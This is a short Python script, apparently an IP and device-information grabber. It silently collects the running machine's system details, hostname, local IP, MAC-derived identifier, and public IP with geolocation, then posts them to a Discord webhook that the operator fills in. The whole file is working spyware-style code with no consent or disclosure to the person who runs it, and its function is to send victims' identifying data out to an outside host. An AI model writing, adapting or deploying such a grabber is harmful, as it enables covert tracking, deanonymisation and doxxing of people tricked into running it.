import socket
import requests
import platform
import uuid
import json
import os

def send_to_discord(webhook_url, embed):
    data = {
        "embeds": [embed]
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
        if response.status_code == 204:
            print("Message successfully sent to Discord.")
        else:
            print(f"Failed to send message to Discord: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {str(e)}")

def get_ip_info():
    try:
        ip = requests.get('https://api64.ipify.org?format=json').json()["ip"]
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def get_device_info():
    try:
        device_info = {
            "System": platform.system(),
            "Node Name": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "UUID": uuid.UUID(int=uuid.getnode()).hex[-12:]
        }
        return device_info
    except Exception as e:
        return {"error": str(e)}

def get_network_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        network_info = {
            "Hostname": hostname,
            "Local IP": ip_address,
        }
        return network_info
    except Exception as e:
        return {"error": str(e)}

def gather_user_info():
    user_info = {
        "Device Info": get_device_info(),
        "Network Info": get_network_info(),
        "IP Info": get_ip_info()
    }
    return user_info

def create_embed(user_info):
    embed = {
        "title": "User Information",
        "description": "Gathered system and network information",
        "color": 16711680,
        "fields": [
            {
                "name": "Device Information",
                "value": "\n".join([f"{key}: {value}" for key, value in user_info["Device Info"].items()]),
                "inline": False
            },
            {
                "name": "Network Information",
                "value": "\n".join([f"{key}: {value}" for key, value in user_info["Network Info"].items()]),
                "inline": False
            },
            {
                "name": "IP Address Information",
                "value": "\n".join([f"{key}: {value}" for key, value in user_info["IP Info"].items()]),
                "inline": False
            }
        ]
    }
    return embed

if __name__ == "__main__":
    webhook_url = "your webhook here" # put ur discord token here
    user_details = gather_user_info()
    embed = create_embed(user_details)
    send_to_discord(webhook_url, embed)